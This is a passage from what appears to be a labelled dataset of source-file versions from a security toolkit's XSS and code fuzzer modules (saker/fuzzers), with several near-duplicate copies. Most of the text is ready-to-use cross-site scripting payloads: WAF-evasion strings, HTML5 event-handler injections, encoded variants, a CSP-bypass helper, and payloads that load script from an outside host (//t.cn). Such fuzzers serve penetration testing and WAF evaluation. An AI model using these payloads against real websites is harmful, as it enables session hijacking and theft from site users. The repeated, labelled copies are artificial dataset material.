    'onwebkitsourceopen',
    'onwebkitspeechchange',
    'onwebkittransitionend',
    'onwheel'
]

_htmlTemplate = '''
<!DOCTYPE html>
<html>
<head>
    <title>XSS Fuzzer</title>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"" />
</head>
<body>
%s
</body>
</html>
'''

# probe for test xss vuln
_probes = [
    """"""'';!--""<XSS>=&{()}"""""",
]

# xss payloads
_payloads = [
    '<q/oncut=open()>',
    '<svg/onload=eval(name)>',
    '<img src=x onerror=alert(/xss/)>',
    """"""<img src=""javascript:alert('xss');"">"""""",
    """"""<style>@im\\port'\\ja\\vasc\\ript:alert(""xss"")';</style>"""""",
    """"""<img style=""xss:expr/*xss*/ession(alert('xss'))""> """""",
    """"""<meta http-equiv=""refresh"" content=""0;url=javascript:alert('xss');"">"""""",
    """"""<meta http-equiv=""refresh"" content=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">"""""",
    """"""<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-"""""",
]

# payload for waf test
_waf_payloads = [
    ""<IMG SRC=JaVaScRiPt:alert('xss')>"",
    '<<script>alert(""xss"");//<</script>',
    """"""<img src=""javascript:alert('xss')"" """""",
    '<a href=""javascript%26colon;alert(1)"">click',
    '<a href=javas&#99;ript:alert(1)>click',
    '<--`<img/src=` onerror=confirm``> --!>',
    '\'""</Script><Html Onmouseover=(confirm)()//'
    '<imG/sRc=l oNerrOr=(prompt)() x>',
    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
    '<deTails open oNToggle=confi\u0072m()>',
    '<img sRc=l oNerrOr=(confirm)() x>',
    '<svg/x="">""/onload=confirm()//',
    '<svg%0Aonload=%09((pro\u006dpt))()//',
    '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
    '<sCript x>confirm``</scRipt x>',
    '<Script x>prompt()</scRiPt x>',
    '<sCriPt sRc=//t.cn>',
    '<embed//sRc=//t.cn>',
    '<base href=//t.cn/><script src=/>',
    '<object//data=//t.cn>',
    '<s="" onclick=confirm``>clickme',
    '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
    '\'""><y///oNMousEDown=((confirm))()>Click',
    '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
    '<img src=x onerror=confir\u006d`1`>',
    '<svg/onload=co\u006efir\u006d`1`>',
    '<?xml version=""1.0""?><html><script xmlns=""http://www.w3.org/1999/xhtml"">alert(1)</script></html>'
]

# payload with html 5 features
# http://html5sec.org
_h5payloads = [
    '<form id=""test""></form><button form=""test"" formaction=""javascript:alert(1)"">X</button>',
    '<input onfocus=alert(1) autofocus>',
    '<input onblur=alert(1) autofocus><input autofocus>',
    '<body onscroll=alert(1)>' + '<br>' * 100 + '<input autofocus>',
    '<video><source onerror=""alert(1)"">',
    '<video onerror=""alert(1)""><source></source></video>',
    '<form><button formaction=""javascript:alert(1)"">X</button>',
    '<math href=""javascript:alert(1)"">CLICKME</math>',
    '<link rel=""import"" href=""test.svg"" />',
    '<iframe srcdoc=""&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;"" />',
]


class XSS(Fuzzer):

    """"""generate XSS payload""""""

    tags = _tags
    events = _events
    htmlTemplate = _htmlTemplate
    probes = _probes
    payloads = _payloads
    waf_payloads = _waf_payloads
    h5payloads = _h5payloads

    def __init__(self, url=""""):
        """"""
        url: xss payload url
        """"""
        super(XSS, self).__init__()
        self.url = url

    @classmethod
    def alterTest(cls, p=False):
        return ""<script>alert(/xss/)</script>""

    @classmethod
    def genTestHTML(cls):
        s = ''
        for t in cls.tags:
            s += '<%s src=""x""' % t
            for e in cls.events:
                s += ''' %s=""console.log('%s %s')"" ''' % (e, t, e)
            s += '>%s</%s>\n' % (t, t)
        return cls.htmlTemplate % s

    def img(self, payload):
        return '<img/onerror=""%s""/src=x>' % payload

    def svg(self, payload):
        return '<svg/onload=""%s""/>' % payload

    def style(self, payload):
        return '<style/onload=""%s""></style>' % payload

    def input(self, payload):
        return '<input/onfocus=""%s""/autofocus>' % payload

    def marquee(self, payload):
        return '<marquee/onstart=""%s""></marquee>' % payload

    def div(self, payload):
        return '<div/onwheel=""%s""/style=""height:200%;width:100%""></div>' % payload

    def script(self):
        payload = ""<script src='%s'></script>"" % self.url
        return payload

    def event(self, element, src, event, js):
        payload = ""<%s src="" % element
        payload += '""%s"" ' % src
        payload += event
        payload += ""=%s >"" % js
        return payload

    def cspBypass(self):
        return ""<link rel='preload' href='%s'>"" % self.url
/n/n/n",0
25,41edd3db5be87f860c0c37199de9b55596b704da,"/saker/fuzzers/code.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

import random
import string
from urllib import quote
from saker.fuzzers.fuzzer import Fuzzer


class Code(Fuzzer):

    """"""Code Payload""""""

    homograph = {
        'a': '\u0430',
        'c': '\u03F2',
        'd': '\u0501',
        'e': '\u0435',
        'h': '\u04BB',
        'i': '\u0456',
        'j': '\u0458',
        'l': '\u04CF',
        'o': '\u043E',
        'p': '\u0440',
        'r': '\u0433',
        'q': '\u051B',
        's': '\u0455',
        'w': '\u051D',
        'x': '\u0445',
        'y': '\u0443',
    }

    def __init__(self):
        super(Code, self).__init__()

    @staticmethod
    def fuzzAscii():
        for i in xrange(256):
            yield chr(i)

    @staticmethod
    def fuzzUnicode(cnt=1):
        for i in xrange(cnt):
            yield unichr(random.randint(0, 0xffff))

    @staticmethod
    def fuzzUnicodeReplace(s, cnt=1):
        # Greek letter
        s = s.replace(""A"", """", cnt)
        s = s.replace(""A"", """", cnt)
        s = s.replace(""A"", """", cnt)
        s = s.replace(""a"", """", cnt)
        # Russian letter 1-4
        s = s.replace(""e"", """", cnt)
        s = s.replace(""a"", """", cnt)
        s = s.replace(""e"", """", cnt)
        s = s.replace(""o"", """", cnt)
        return s

    @staticmethod
    def fuzzErrorUnicode(s):
        # https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html
        return s + chr(random.randint(0xC2, 0xef))

    @staticmethod
    def urlencode(s, force=False):
        if not force:
            s = quote(s)
        else:
            s = map(lambda i: hex(ord(i)).replace(""0x"", ""%""), s)
            s = """".join(s)
        return s
/n/n/n",1
26,9d984e18d74febb18c47c74a2e0ad9fe6efc0478,"saker/fuzzers/xss.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer

_tags = [
    'a',
    'abbr',
    'acronym',
    'address',
    'applet',
    'area',
    'article',
    'aside',
    'audio',
    'b',
    'base',
    'basefont',
    'bdi',
    'bdo',
    'bgsound',
    'big',
    'blink',
    'blockquote',
    'body',
    'br',
    'button',
    'canvas',
    'caption',
    'center',
    'cite',
    'code',
    'col',
    'colgroup',
    'command',
    'content',
    'data',
    'datalist',
    'dd',
    'del',
    'details',
    'dfn',
    'dialog',
    'dir',
    'div',
    'dl',
    'dt',
    'element',
    'em',
    'embed',
    'fieldset',
    'figcaption',
    'figure',
    'font',
    'footer',
    'form',
    'frame',
    'frameset',
    'h1',
    'h2',
    'h3',
    'h4',
    'h5',
    'h6',
    'head',
    'header',
    'hgroup',
    'hr',
    'html',
    'i',
    'iframe',
    'image',
    'img',
    'input',
    'ins',
    'isindex',
    'kbd',
    'keygen',
    'label',
    'layer',
    'legend',
    'li',
    'link',
    'listing',
    'main',
    'map',
    'mark',
    'marquee',
    'menu',
    'menuitem',
    'meta',
    'meter',
    'multicol',
    'nav',
    'nobr',
    'noembed',
    'noframes',
    'nolayer',
    'noscript',
    'object',
    'ol',
    'optgroup',
    'option',
    'output',
    'p',
    'param',
    'picture',
    # 'plaintext',
    'pre',
    'progress',
    'q',
    'rp',
    'rt',
    'rtc',
    'ruby',
    's',
    'samp',
    'script',
    'section',
    'select',
    'shadow',
    'small',
    'source',
    'spacer',
    'span',
    'strike',
    'strong',
    'style',
    'sub',
    'summary',
    'sup',
    'table',
    'tbody',
    'td',
    'template',
    'textarea',
    'tfoot',
    'th',
    'thead',
    'time',
    'title',
    'tr',
    'track',
    'tt',
    'u',
    'ul',
    'var',
    'video',
    'wbr',
    'xmp',
]

_events = [
    'onabort',
    'onautocomplete',
    'onautocompleteerror',
    'onafterscriptexecute',
    'onanimationend',
    'onanimationiteration',
    'onanimationstart',
    'onbeforecopy',
    'onbeforecut',
    'onbeforeload',
    'onbeforepaste',
    'onbeforescriptexecute',
    'onbeforeunload',
    'onbegin',
    'onblur',
    'oncanplay',
    'oncanplaythrough',
    'onchange',
    'onclick',
    'oncontextmenu',
    'oncopy',
    'oncut',
    'ondblclick',
    'ondrag',
    'ondragend',
    'ondragenter',
    'ondragleave',
    'ondragover',
    'ondragstart',
    'ondrop',
    'ondurationchange',
    'onend',
    'onemptied',
    'onended',
    'onerror',
    'onfocus',
    'onfocusin',
    'onfocusout',
    'onhashchange',
    'oninput',
    'oninvalid',
    'onkeydown',
    'onkeypress',
    'onkeyup',
    'onload',
    'onloadeddata',
    'onloadedmetadata',
    'onloadstart',
    'onmessage',
    'onmousedown',
    'onmouseenter',
    'onmouseleave',
    'onmousemove',
    'onmouseout',
    'onmouseover',
    'onmouseup',
    'onmousewheel',
    'onoffline',
    'ononline',
    'onorientationchange',
    'onpagehide',
    'onpageshow',
    'onpaste',
    'onpause',
    'onplay',
    'onplaying',
    'onpopstate',
    'onprogress',
    'onratechange',
    'onreset',
    'onresize',
    'onscroll',
    'onsearch',
    'onseeked',
    'onseeking',
    'onselect',
    'onselectionchange',
    'onselectstart',
    'onstalled',
    'onstorage',
    'onsubmit',
    'onsuspend',
    'ontimeupdate',
    'ontoggle',
    'ontouchcancel',
    'ontouchend',
    'ontouchmove',
    'ontouchstart',
    'ontransitionend',
    'onunload',
    'onvolumechange',
    'onwaiting',
    'onwebkitanimationend',
    'onwebkitanimationiteration',
    'onwebkitanimationstart',
    'onwebkitfullscreenchange',
    'onwebkitfullscreenerror',
    'onwebkitkeyadded',
    'onwebkitkeyerror',
    'onwebkitkeymessage',
    'onwebkitneedkey',
    'onwebkitsourceclose',
    'onwebkitsourceended',
    'onwebkitsourceopen',
    'onwebkitspeechchange',
    'onwebkittransitionend',
    'onwheel'
]

_htmlTemplate = '''
<!DOCTYPE html>
<html>
<head>
    <title>XSS Fuzzer</title>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"" />
</head>
<body>
%s
</body>
</html>
'''

# probe for test xss vuln
_probes = [
    """"""'';!--""<XSS>=&{()}"""""",
]

# xss payloads
_payloads = [
    '<q/oncut=open()>',
    '<svg/onload=eval(name)>',
    '<svg/onload=eval(window.name)>',
    '<svg/onload=eval(location.hash.slice(1))>',
    '<img src=x onerror=alert(/xss/)>',
    """"""<img src=""javascript:alert('xss');"">"""""",
    """"""<style>@im\\port'\\ja\\vasc\\ript:alert(""xss"")';</style>"""""",
    """"""<img style=""xss:expr/*xss*/ession(alert('xss'))""> """""",
    """"""<meta http-equiv=""refresh"" content=""0;url=javascript:alert('xss');"">"""""",
    """"""<meta http-equiv=""refresh"" content=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">"""""",
    """"""<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-""""""
]

# payload for waf test
_waf_payloads = [
    ""<IMG SRC=JaVaScRiPt:alert('xss')>"",
    '<<script>alert(""xss"");//<</script>',
    """"""<img src=""javascript:alert('xss')"" """""",
    '<a href=""javascript%26colon;alert(1)"">click',
    '<a href=javas&#99;ript:alert(1)>click',
    '<--`<img/src=` onerror=confirm``> --!>',
    '\'""</Script><Html Onmouseover=(confirm)()//'
    '<imG/sRc=l oNerrOr=(prompt)() x>',
    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
    '<deTails open oNToggle=confi\u0072m()>',
    '<img sRc=l oNerrOr=(confirm)() x>',
    '<svg/x="">""/onload=confirm()//',
    '<svg%0Aonload=%09((pro\u006dpt))()//',
    '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
    '<sCript x>confirm``</scRipt x>',
    '<Script x>prompt()</scRiPt x>',
    '<sCriPt sRc=//t.cn>',
    '<embed//sRc=//t.cn>',
    '<base href=//t.cn/><script src=/>',
    '<object//data=//t.cn>',
    '<s="" onclick=confirm``>clickme',
    '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
    '\'""><y///oNMousEDown=((confirm))()>Click',
    '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
    '<img src=x onerror=confir\u006d`1`>',
    '<svg/onload=co\u006efir\u006d`1`>',
    '<?xml version=""1.0""?><html><script xmlns=""http://www.w3.org/1999/xhtml"">alert(1)</script></html>',
    '<scriscriptpt>alert(/xss/)</scriscriptpt>',
    'scriptalert(XSS)/script'
]

# payload with html 5 features
# http://html5sec.org
_h5payloads = [
    '<form id=""test""></form><button form=""test"" formaction=""javascript:alert(1)"">X</button>',
    '<input onfocus=alert(1) autofocus>',
    '<input onblur=alert(1) autofocus><input autofocus>',
    '<body onscroll=alert(1)>' + '<br>' * 100 + '<input autofocus>',
    '<video><source onerror=""alert(1)"">',
    '<video onerror=""alert(1)""><source></source></video>',
    '<form><button formaction=""javascript:alert(1)"">X</button>',
    '<math href=""javascript:alert(1)"">CLICKME</math>',
    '<link rel=""import"" href=""test.svg"" />',
    '<iframe srcdoc=""&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;"" />',
]


class XSS(Fuzzer):

    """"""generate XSS payload""""""

    tags = _tags
    events = _events
    htmlTemplate = _htmlTemplate
    probes = _probes
    payloads = _payloads
    waf_payloads = _waf_payloads
    h5payloads = _h5payloads

    def __init__(self, url=""""):
        """"""
        url: xss payload url
        """"""
        super(XSS, self).__init__()
        self.url = url

    @classmethod
    def alterTest(cls, p=False):
        return ""<script>alert(/xss/)</script>""

    @classmethod
    def genTestHTML(cls):
        s = ''
        for t in cls.tags:
            s += '<%s src=""x""' % t
            for e in cls.events:
                s += ''' %s=""console.log('%s %s')"" ''' % (e, t, e)
            s += '>%s</%s>\n' % (t, t)
        return cls.htmlTemplate % s

    @classmethod
    def acmehttp01(cls, url):
        # https://labs.detectify.com/2018/09/04/xss-using-quirky-implementations-of-acme-http-01/
        return url + '/.well-known/acme-challenge/?<h1>hi'

    def img(self, payload):
        return '<img/onerror=""%s""/src=x>' % payload

    def svg(self, payload):
        return '<svg/onload=""%s""/>' % payload

    def style(self, payload):
        return '<style/onload=""%s""></style>' % payload

    def input(self, payload):
        return '<input/onfocus=""%s""/autofocus>' % payload

    def marquee(self, payload):
        return '<marquee/onstart=""%s""></marquee>' % payload

    def div(self, payload):
        return '<div/onwheel=""%s""/style=""height:200%;width:100%""></div>' % payload

    def script(self):
        payload = ""<script src='%s'></script>"" % self.url
        return payload

    def event(self, element, src, event, js):
        payload = ""<%s src="" % element
        payload += '""%s"" ' % src
        payload += event
        payload += ""=%s >"" % js
        return payload

    def cspBypass(self):
        return ""<link rel='preload' href='%s'>"" % self.url
/n/n/n",0
27,9d984e18d74febb18c47c74a2e0ad9fe6efc0478,"/saker/fuzzers/xss.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer

_tags = [
    'a',
    'abbr',
    'acronym',
    'address',
    'applet',
    'area',
    'article',
    'aside',
    'audio',
    'b',
    'base',
    'basefont',
    'bdi',
    'bdo',
    'bgsound',
    'big',
    'blink',
    'blockquote',
    'body',
    'br',
    'button',
    'canvas',
    'caption',
    'center',
    'cite',
    'code',
    'col',
    'colgroup',
    'command',
    'content',
    'data',
    'datalist',
    'dd',
    'del',
    'details',
    'dfn',
    'dialog',
    'dir',
    'div',
    'dl',
    'dt',
    'element',
    'em',
    'embed',
    'fieldset',
    'figcaption',
    'figure',
    'font',
    'footer',
    'form',
    'frame',
    'frameset',
    'h1',
    'h2',
    'h3',
    'h4',
    'h5',
    'h6',
    'head',
    'header',
    'hgroup',
    'hr',
    'html',
    'i',
    'iframe',
    'image',
    'img',
    'input',
    'ins',
    'isindex',
    'kbd',
    'keygen',
    'label',
    'layer',
    'legend',
    'li',
    'link',
    'listing',
    'main',
    'map',
    'mark',
    'marquee',
    'menu',
    'menuitem',
    'meta',
    'meter',
    'multicol',
    'nav',
    'nobr',
    'noembed',
    'noframes',
    'nolayer',
    'noscript',
    'object',
    'ol',
    'optgroup',
    'option',
    'output',
    'p',
    'param',
    'picture',
    # 'plaintext',
    'pre',
    'progress',
    'q',
    'rp',
    'rt',
    'rtc',
    'ruby',
    's',
    'samp',
    'script',
    'section',
    'select',
    'shadow',
    'small',
    'source',
    'spacer',
    'span',
    'strike',
    'strong',
    'style',
    'sub',
    'summary',
    'sup',
    'table',
    'tbody',
    'td',
    'template',
    'textarea',
    'tfoot',
    'th',
    'thead',
    'time',
    'title',
    'tr',
    'track',
    'tt',
    'u',
    'ul',
    'var',
    'video',
    'wbr',
    'xmp',
]

_events = [
    'onabort',
    'onautocomplete',
    'onautocompleteerror',
    'onafterscriptexecute',
    'onanimationend',
    'onanimationiteration',
    'onanimationstart',
    'onbeforecopy',
    'onbeforecut',
    'onbeforeload',
    'onbeforepaste',
    'onbeforescriptexecute',
    'onbeforeunload',
    'onbegin',
    'onblur',
    'oncanplay',
    'oncanplaythrough',
    'onchange',
    'onclick',
    'oncontextmenu',
    'oncopy',
    'oncut',
    'ondblclick',
    'ondrag',
    'ondragend',
    'ondragenter',
    'ondragleave',
    'ondragover',
    'ondragstart',
    'ondrop',
    'ondurationchange',
    'onend',
    'onemptied',
    'onended',
    'onerror',
    'onfocus',
    'onfocusin',
    'onfocusout',
    'onhashchange',
    'oninput',
    'oninvalid',
    'onkeydown',
    'onkeypress',
    'onkeyup',
    'onload',
    'onloadeddata',
    'onloadedmetadata',
    'onloadstart',
    'onmessage',
    'onmousedown',
    'onmouseenter',
    'onmouseleave',
    'onmousemove',
    'onmouseout',
    'onmouseover',
    'onmouseup',
    'onmousewheel',
    'onoffline',
    'ononline',
    'onorientationchange',
    'onpagehide',
    'onpageshow',
    'onpaste',
    'onpause',
    'onplay',
    'onplaying',
    'onpopstate',
    'onprogress',
    'onratechange',
    'onreset',
    'onresize',
    'onscroll',
    'onsearch',
    'onseeked',
    'onseeking',
    'onselect',
    'onselectionchange',
    'onselectstart',
    'onstalled',
    'onstorage',
    'onsubmit',
    'onsuspend',
    'ontimeupdate',
    'ontoggle',
    'ontouchcancel',
    'ontouchend',
    'ontouchmove',
    'ontouchstart',
    'ontransitionend',
    'onunload',
    'onvolumechange',
    'onwaiting',
    'onwebkitanimationend',
    'onwebkitanimationiteration',
    'onwebkitanimationstart',
    'onwebkitfullscreenchange',
    'onwebkitfullscreenerror',
    'onwebkitkeyadded',
    'onwebkitkeyerror',
    'onwebkitkeymessage',
    'onwebkitneedkey',
    'onwebkitsourceclose',
    'onwebkitsourceended',
    'onwebkitsourceopen',
    'onwebkitspeechchange',
    'onwebkittransitionend',
    'onwheel'
]

_htmlTemplate = '''
<!DOCTYPE html>
<html>
<head>
    <title>XSS Fuzzer</title>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"" />
</head>
<body>
%s
</body>
</html>
'''

# probe for test xss vuln
_probes = [
    """"""'';!--""<XSS>=&{()}"""""",
]

# xss payloads
_payloads = [
    '<q/oncut=open()>',
    '<svg/onload=eval(name)>',
    '<img src=x onerror=alert(/xss/)>',
    """"""<img src=""javascript:alert('xss');"">"""""",
    """"""<style>@im\\port'\\ja\\vasc\\ript:alert(""xss"")';</style>"""""",
    """"""<img style=""xss:expr/*xss*/ession(alert('xss'))""> """""",
    """"""<meta http-equiv=""refresh"" content=""0;url=javascript:alert('xss');"">"""""",
    """"""<meta http-equiv=""refresh"" content=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">"""""",
    """"""<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-"""""",
]

# payload for waf test
_waf_payloads = [
    ""<IMG SRC=JaVaScRiPt:alert('xss')>"",
    '<<script>alert(""xss"");//<</script>',
    """"""<img src=""javascript:alert('xss')"" """""",
    '<a href=""javascript%26colon;alert(1)"">click',
    '<a href=javas&#99;ript:alert(1)>click',
    '<--`<img/src=` onerror=confirm``> --!>',
    '\'""</Script><Html Onmouseover=(confirm)()//'
    '<imG/sRc=l oNerrOr=(prompt)() x>',
    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
    '<deTails open oNToggle=confi\u0072m()>',
    '<img sRc=l oNerrOr=(confirm)() x>',
    '<svg/x="">""/onload=confirm()//',
    '<svg%0Aonload=%09((pro\u006dpt))()//',
    '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
    '<sCript x>confirm``</scRipt x>',
    '<Script x>prompt()</scRiPt x>',
    '<sCriPt sRc=//t.cn>',
    '<embed//sRc=//t.cn>',
    '<base href=//t.cn/><script src=/>',
    '<object//data=//t.cn>',
    '<s="" onclick=confirm``>clickme',
    '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
    '\'""><y///oNMousEDown=((confirm))()>Click',
    '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
    '<img src=x onerror=confir\u006d`1`>',
    '<svg/onload=co\u006efir\u006d`1`>',
    '<?xml version=""1.0""?><html><script xmlns=""http://www.w3.org/1999/xhtml"">alert(1)</script></html>'
]

# payload with html 5 features
# http://html5sec.org
_h5payloads = [
    '<form id=""test""></form><button form=""test"" formaction=""javascript:alert(1)"">X</button>',
    '<input onfocus=alert(1) autofocus>',
    '<input onblur=alert(1) autofocus><input autofocus>',
    '<body onscroll=alert(1)>' + '<br>' * 100 + '<input autofocus>',
    '<video><source onerror=""alert(1)"">',
    '<video onerror=""alert(1)""><source></source></video>',
    '<form><button formaction=""javascript:alert(1)"">X</button>',
    '<math href=""javascript:alert(1)"">CLICKME</math>',
    '<link rel=""import"" href=""test.svg"" />',
    '<iframe srcdoc=""&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;"" />',
]


class XSS(Fuzzer):

    """"""generate XSS payload""""""

    tags = _tags
    events = _events
    htmlTemplate = _htmlTemplate
    probes = _probes
    payloads = _payloads
    waf_payloads = _waf_payloads
    h5payloads = _h5payloads

    def __init__(self, url=""""):
        """"""
        url: xss payload url
        """"""
        super(XSS, self).__init__()
        self.url = url

    @classmethod
    def alterTest(cls, p=False):
        return ""<script>alert(/xss/)</script>""

    @classmethod
    def genTestHTML(cls):
        s = ''
        for t in cls.tags:
            s += '<%s src=""x""' % t
            for e in cls.events:
                s += ''' %s=""console.log('%s %s')"" ''' % (e, t, e)
            s += '>%s</%s>\n' % (t, t)
        return cls.htmlTemplate % s

    @classmethod
    def acmehttp01(cls, url):
        # https://labs.detectify.com/2018/09/04/xss-using-quirky-implementations-of-acme-http-01/
        return url + '/.well-known/acme-challenge/?<h1>hi'

    def img(self, payload):
        return '<img/onerror=""%s""/src=x>' % payload

    def svg(self, payload):
        return '<svg/onload=""%s""/>' % payload

    def style(self, payload):
        return '<style/onload=""%s""></style>' % payload

    def input(self, payload):
        return '<input/onfocus=""%s""/autofocus>' % payload

    def marquee(self, payload):
        return '<marquee/onstart=""%s""></marquee>' % payload

    def div(self, payload):
        return '<div/onwheel=""%s""/style=""height:200%;width:100%""></div>' % payload

    def script(self):
        payload = ""<script src='%s'></script>"" % self.url
        return payload

    def event(self, element, src, event, js):
        payload = ""<%s src="" % element
        payload += '""%s"" ' % src
        payload += event
        payload += ""=%s >"" % js
        return payload

    def cspBypass(self):
        return ""<link rel='preload' href='%s'>"" % self.url
/n/n/n",1
28,9d9faf7de059066aab203f069eade13e89a93b39,"saker/fuzzers/xss.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer

_tags = [
    'a',
    'abbr',
    'acronym',
    'address',
    'applet',
    'area',
    'article',
    'aside',
    'audio',
    'b',
    'base',
    'basefont',
    'bdi',
    'bdo',
    'bgsound',
    'big',
    'blink',
    'blockquote',
    'body',
    'br',
    'button',
    'canvas',
    'caption',
    'center',
    'cite',
    'code',
    'col',
    'colgroup',
    'command',
    'content',
    'data',
    'datalist',
    'dd',
    'del',
    'details',
    'dfn',
    'dialog',
    'dir',
    'div',
    'dl',
    'dt',
    'element',
    'em',
    'embed',
    'fieldset',
    'figcaption',
    'figure',
    'font',
    'footer',
    'form',
    'frame',
    'frameset',
    'h1',
    'h2',
    'h3',
    'h4',
    'h5',
    'h6',
    'head',
    'header',
    'hgroup',
    'hr',
    'html',
    'i',
    'iframe',
    'image',
    'img',
    'input',
    'ins',
    'isindex',
    'kbd',
    'keygen',
    'label',
    'layer',
    'legend',
    'li',
    'link',
    'listing',
    'main',
    'map',
    'mark',
    'marquee',
    'menu',
    'menuitem',
    'meta',
    'meter',
    'multicol',
    'nav',
    'nobr',
    'noembed',
    'noframes',
    'nolayer',
    'noscript',
    'object',
    'ol',
    'optgroup',
    'option',
    'output',
    'p',
    'param',
    'picture',
    # 'plaintext',
    'pre',
    'progress',
    'q',
    'rp',
    'rt',
    'rtc',
    'ruby',
    's',
    'samp',
    'script',
    'section',
    'select',
    'shadow',
    'small',
    'source',
    'spacer',
    'span',
    'strike',
    'strong',
    'style',
    'sub',
    'summary',
    'sup',
    'table',
    'tbody',
    'td',
    'template',
    'textarea',
    'tfoot',
    'th',
    'thead',
    'time',
    'title',
    'tr',
    'track',
    'tt',
    'u',
    'ul',
    'var',
    'video',
    'wbr',
    'xmp',
]

_events = [
    'onabort',
    'onautocomplete',
    'onautocompleteerror',
    'onafterscriptexecute',
    'onanimationend',
    'onanimationiteration',
    'onanimationstart',
    'onbeforecopy',
    'onbeforecut',
    'onbeforeload',
    'onbeforepaste',
    'onbeforescriptexecute',
    'onbeforeunload',
    'onbegin',
    'onblur',
    'oncanplay',
    'oncanplaythrough',
    'onchange',
    'onclick',
    'oncontextmenu',
    'oncopy',
    'oncut',
    'ondblclick',
    'ondrag',
    'ondragend',
    'ondragenter',
    'ondragleave',
    'ondragover',
    'ondragstart',
    'ondrop',
    'ondurationchange',
    'onend',
    'onemptied',
    'onended',
    'onerror',
    'onfocus',
    'onfocusin',
    'onfocusout',
    'onhashchange',
    'oninput',
    'oninvalid',
    'onkeydown',
    'onkeypress',
    'onkeyup',
    'onload',
    'onloadeddata',
    'onloadedmetadata',
    'onloadstart',
    'onmessage',
    'onmousedown',
    'onmouseenter',
    'onmouseleave',
    'onmousemove',
    'onmouseout',
    'onmouseover',
    'onmouseup',
    'onmousewheel',
    'onoffline',
    'ononline',
    'onorientationchange',
    'onpagehide',
    'onpageshow',
    'onpaste',
    'onpause',
    'onplay',
    'onplaying',
    'onpopstate',
    'onprogress',
    'onratechange',
    'onreset',
    'onresize',
    'onscroll',
    'onsearch',
    'onseeked',
    'onseeking',
    'onselect',
    'onselectionchange',
    'onselectstart',
    'onstalled',
    'onstorage',
    'onsubmit',
    'onsuspend',
    'ontimeupdate',
    'ontoggle',
    'ontouchcancel',
    'ontouchend',
    'ontouchmove',
    'ontouchstart',
    'ontransitionend',
    'onunload',
    'onvolumechange',
    'onwaiting',
    'onwebkitanimationend',
    'onwebkitanimationiteration',
    'onwebkitanimationstart',
    'onwebkitfullscreenchange',
    'onwebkitfullscreenerror',
    'onwebkitkeyadded',
    'onwebkitkeyerror',
    'onwebkitkeymessage',
    'onwebkitneedkey',
    'onwebkitsourceclose',
    'onwebkitsourceended',
    'onwebkitsourceopen',
    'onwebkitspeechchange',
    'onwebkittransitionend',
    'onwheel'
]

_htmlTemplate = '''
<!DOCTYPE html>
<html>
<head>
    <title>XSS Fuzzer</title>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"" />
</head>
<body>
%s
</body>
</html>
'''

# probe for test xss vuln
_probes = [
    """"""'';!--""<XSS>=&{()}"""""",
]

# xss payloads
_payloads = [
    '<q/oncut=open()>',
    '<svg/onload=eval(name)>',
    '<svg/onload=eval(window.name)>',
    '<svg/onload=eval(location.hash.slice(1))>',
    '<img src=x onerror=alert(/xss/)>',
    """"""<img src=""javascript:alert('xss');"">"""""",
    """"""<style>@im\\port'\\ja\\vasc\\ript:alert(""xss"")';</style>"""""",
    """"""<img style=""xss:expr/*xss*/ession(alert('xss'))""> """""",
    """"""<meta http-equiv=""refresh"" content=""0;url=javascript:alert('xss');"">"""""",
    """"""<meta http-equiv=""refresh"" content=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">"""""",
    """"""<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-""""""
]

# reg test payloads
_reg_payloads = [
    # no reg
    ""<svg"",
    # <[a-z]+
    ""<dev"",
    # ^<[a-z]+
    ""x<dev"",
    # <[a-zA-Z]+
    ""<dEv"",
    # <[a-zA-Z0-9]+
    ""<d3V"",
    # <.+
    ""<d|3v "",
]

# payload for waf test
_waf_payloads = [
    ""<IMG SRC=JaVaScRiPt:alert('xss')>"",
    '<<script>alert(""xss"");//<</script>',
    """"""<img src=""javascript:alert('xss')"" """""",
    '<a href=""javascript%26colon;alert(1)"">click',
    '<a href=javas&#99;ript:alert(1)>click',
    '<--`<img/src=` onerror=confirm``> --!>',
    '\'""</Script><Html Onmouseover=(confirm)()//'
